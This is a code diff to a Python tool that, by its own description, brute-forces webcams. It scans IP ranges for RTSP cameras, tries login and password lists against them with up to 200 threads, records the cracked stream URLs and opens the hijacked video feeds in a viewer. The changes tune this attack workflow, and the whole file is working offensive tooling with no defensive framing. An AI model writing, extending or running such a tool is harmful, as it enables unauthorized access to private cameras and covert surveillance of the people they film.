@@ -2,7 +2,6 @@ import socket
 import tqdm
 import threading
 import base64
-import tabulate
 import re
 import queue
 import time
@@ -16,7 +15,7 @@ from pathlib import Path
 about = "bruteforcing webcams by http/https"
 class main(object):
     def __init__(self):
-        self.reset()
+        self.brute_threads = 200
         self.password_list = None
         self.login_list = None
         self.running = True
@@ -26,19 +25,6 @@ class main(object):
         self.port = 554
         self.threads = 20
         self.scan_timeout = 2
-    
-    def reset(self):
-        scan = os.path.normpath(os.getcwd() + "/temp/IpCams_scan_result.txt")
-        brute = os.path.normpath(os.getcwd() + "/temp/IpCams_brute_result.txt")
-        if os.path.exists(scan):
-            os.remove(scan)
-        if os.path.exists(brute):
-            os.remove(brute)
-            
-        fp = open(scan, 'x')
-        fp.close()
-        fp = open(brute, 'x')
-        fp.close()
         
     def run(self):
         while self.running:
@@ -46,59 +32,63 @@ class main(object):
             command = command.split(" ")
             
             if command[0] == "set":
-                if len(command) < 3:
-                    print('[ Wrong syntax ]')
-                else:
-                    match (command[1]):
-                        case "ip_ranges":
-                            try:
-                                self.ip_ranges = command[2].split(",")
-                                print(f"[ ip_ranges > {len(self.ip_ranges)} ]")
-                            except Exception as e:
-                                if "--debug" in sys.argv:
-                                    print(e.with_traceback(e))
-                                else:
-                                    print(f"[ value must be list]")
-                                    
-                        case "port":
-                            try:
-                                self.port = int(command[2])
-                                print(f"[ port > {self.port} ]")
-                            except Exception as e:
-                                if "--debug" in sys.argv:
-                                    print(e.with_traceback(e))
-                                else:
-                                    print(f"[ value must be num]")
-                        case "scan_timeout":
-                            try:
-                                self.scan_timeout = int(command[2])
-                                print(f"[ scan_timeout > {self.scan_timeout} ]")
-                            except Exception as e:
-                                if "--debug" in sys.argv:
-                                    print(e.with_traceback(e))
-                                else:
-                                    print(f"[ value must be num]")
-                        case "password_list":
-                            try:
-                                self.password_list = str(command[2])
-                                print(f"[ password_list > {self.password_list} ]")
-                            except Exception as e:
-                                if "--debug" in sys.argv:
-                                    print(e.with_traceback(e))
-                                else:
-                                    print(f"[ value must be path]")
-                        case "login_list":
-                            try:
-                                self.login_list = str(command[2])
-                                print(f"[ login_list > {self.login_list} ]")
-                            except Exception as e:
-                                if "--debug" in sys.argv:
-                                    print(e.with_traceback(e))
-                                else:     
-                                    print(f"[ value must be path]")
-                        case _:
-                            print("[ Wrong option name ]")
-                        
+                match (command[1]):
+                    case "ip_ranges":
+                        try:
+                            self.ip_ranges = command[2].split(",")
+                            print(f"[ ip_ranges > {len(self.ip_ranges)} ]")
+                        except Exception as e:
+                            if "--debug" in sys.argv:
+                                print(e.with_traceback(e))
+                            else:
+                                print(f"[ value must be list]")
+                                
+                    case "port":
+                        try:
+                            self.port = int(command[2])
+                            print(f"[ port > {self.port} ]")
+                        except Exception as e:
+                            if "--debug" in sys.argv:
+                                print(e.with_traceback(e))
+                            else:
+                                print(f"[ value must be num]")
+                    case "scan_timeout":
+                        try:
+                            self.scan_timeout = int(command[2])
+                            print(f"[ scan_timeout > {self.scan_timeout} ]")
+                        except Exception as e:
+                            if "--debug" in sys.argv:
+                                print(e.with_traceback(e))
+                            else:
+                                print(f"[ value must be num]")
+                    case "brute_threads":
+                        try:
+                            self.brute_threads = int(command[2])
+                            print(f"[ brute_threads > {self.brute_threads} ]")
+                        except Exception as e:
+                            if "--debug" in sys.argv:
+                                print(e.with_traceback(e))
+                            else:
+                                print(f"[ value must be num]")
+                    case "password_list":
+                        try:
+                            self.password_list = str(command[2])
+                            print(f"[ password_list > {self.password_list} ]")
+                        except Exception as e:
+                            if "--debug" in sys.argv:
+                                print(e.with_traceback(e))
+                            else:
+                                print(f"[ value must be path]")
+                    case "login_list":
+                        try:
+                            self.login_list = str(command[2])
+                            print(f"[ login_list > {self.login_list} ]")
+                        except Exception as e:
+                            if "--debug" in sys.argv:
+                                print(e.with_traceback(e))
+                            else:     
+                                print(f"[ value must be path]")
+                    
             if command[0] == "load_targets":
                 try:
                     self.load_targets(command[1])
@@ -115,7 +105,7 @@ class main(object):
                 print(f"password_list: {str(self.password_list)}", end="\n")
                 print(f"port: {str(self.port)}", end="\n")
                 print(f"scan_timeout: {str(self.scan_timeout)}", end="\n")
-        
+                print(f"brute_threads: {str(self.brute_threads)}", end="\n")
         
             if command[0] == "run":
                 if len(command) != 2:
@@ -136,25 +126,13 @@ class main(object):
             if command[0] == "clear":
                 os.system("cls||clear")
             
-            if command[0] == "help":
-                
-                help = [
-                    ["start scan","start scanning ips to find cams"],
-                    ["start brute","start brute forcing cams"],
-                    ["show","show options of tool"],
-                    ["set [option] [value]","set value of option"],
-                    ["view", "cams viewer"]                    
-                ]
-                
-                print(tabulate.tabulate(help, tablefmt="simple_grid"))
-            
     def module_scan_run(self):
         for ip_range in self.ip_ranges: 
             self.scan_for_targets(ip_range)
-        with open(os.path.normpath(os.getcwd() + "/temp/IpCams_scan_result.txt"), "w+") as f:
+        with open("temp/IpCams_scan_result.txt", "w") as f:
             for ip in self.founded_targets:
                 f.write(f"{ip}\n")
-            print("[ Result saved in IpCams_scan_result.txt ]")
+            print("[ Result saved in temp/IpCams_scan_result.txt ]")
     
     def load_targets(self, path):
         with open(path, "r") as f:
@@ -172,11 +150,10 @@ class main(object):
             if self.password_list is None:
                 self.password_list = "admin"
                 
-            print(self.founded_targets)
-            url = RtspBrute(self.founded_targets, self.login_list, self.password_list, self.port ).run() 
+            url = RtspBrute("./temp/IpCams_scan_result.txt", self.login_list, self.password_list, self.port, self.brute_threads).run() 
             if url is not None:
                 self.brute_result.append(url)
-                print("[ Result saved in IpCams_brute_result.txt ]")
+                print("[ Result saved in temp/IpCams_brute_result.txt ]")
                 
             print(f"[ Total - {len(self.brute_result)} ]")
             
@@ -186,6 +163,7 @@ class main(object):
         end_ip =  range_start_end[1].split(".") 
         ips = list()
         for a in range(int(start_ip[0]), int(end_ip[0])+1):
+            
             for b in range(int(start_ip[1]), int(end_ip[1])+1):
                 for c in range(int(start_ip[2]), int(end_ip[2])+1):
                     for d in range(int(start_ip[3]), int(end_ip[3])+1):   
@@ -213,15 +191,16 @@ class main(object):
 #####################################################           
             
 class RtspBrute(object):
-    def __init__(self, targets, username, password, port):
+    def __init__(self, target, username, password, port, threads):
+        self.brute_threads = threads
         self.port = port
         self.brute_result = None
-        self.targetlist = targets
+        self.targetlist = self.param_to_list(target, method='target')
         self.usernamelist = self.param_to_list(username)
         self.passwordlist = self.param_to_list(password)
 
     def run(self):
-        threads = 100
+        threads = self.brute_threads
         global q
         q = queue.Queue()
         for _target in self.targetlist:
@@ -291,7 +270,7 @@ class RtspBrute(object):
             return
 
     def brute_force(self):
-        with open(os.path.normpath(os.getcwd() + "/temp/IpCams_brute_result.txt"), "a+") as f:
+        with open("temp/IpCams_brute_result.txt", "r") as f:
             file = f.readlines()
             
         while not q.empty():
@@ -303,7 +282,7 @@ class RtspBrute(object):
                     # print("401 Unauthorized")
                     for username in self.usernamelist:
                         for password in self.passwordlist:
-                            # print(password)
+                            print(f"[ {target} ] - {username} : {password}\r", end="", flush=True)
                             if data is not None:
                                 if "WWW-Authenticate: Basic" in data:
                                     data = self.rtsp_request(target, username, password)
@@ -313,7 +292,7 @@ class RtspBrute(object):
                                             if res not in file:
                                                 print(res)
                                                 self.brute_result = res
-                                                with open(os.path.normpath(os.getcwd() + "/temp/IpCams_brute_result.txt"), "a+") as f:
+                                                with open("temp/IpCams_brute_result.txt", "a") as f:
                                                     f.writelines(f"\n{res}")
                                             pass
                                         if "401 Unauthorized" in data:
@@ -327,7 +306,7 @@ class RtspBrute(object):
                     if res not in file:
                         print(res)
                         self.brute_result = res
-                        with open(os.path.normpath(os.getcwd() + "/temp/IpCams_brute_result.txt"), "a+") as f:
+                        with open("temp/IpCams_brute_result.txt", "a") as f:
                             f.writelines(f"\n{res}")
                 else:
                     pass
@@ -400,19 +379,10 @@ class RTSP_Viewer(object):
             if camera_num == list_len:
                 camera_num = 0
             
-            if command[0] == "help":
-                
-                help = [
-                    ["next","next camera"],
-                    ["back","previous camera"],
-                    ["get [cam_number]","get camera by id"],          
-                ]
-                
-                print(tabulate.tabulate(help, tablefmt="simple_grid"))
             
             
     def get_rtsp_file(self):
-        with open(os.path.normpath(os.getcwd() + "/temp/IpCams_brute_result.txt"), "a+") as f:
+        with open("./temp/IpCams_brute_result.txt", "r") as f:
             return f.readlines()
         
     def camera_capture(self, num, rtsp_list, path_list):
@@ -428,7 +398,7 @@ class RTSP_Viewer(object):
                     break
                 else:
                     url = rtsp_list[num].replace("av1",path_list[path_num])
-                    print(f"Trying to connect: {path_num}/{len(path_list)}\n", end="")
+                    print(f"Trying to connect: {path_num+1}/{len(path_list)}\n", end="")
                     try:
                         video = cv2.VideoCapture(url)
                     except Exception:
@@ -437,7 +407,7 @@ class RTSP_Viewer(object):
             else:
                 if not self.in_use:
                     self.in_use = True
-                cv2.imshow(f'Camera_{num}', frame)
+                cv2.imshow(f'Camera_{num+1}', frame)
                 if cv2.waitKey(50) == 27:
                     run = False
         print("\n\n")
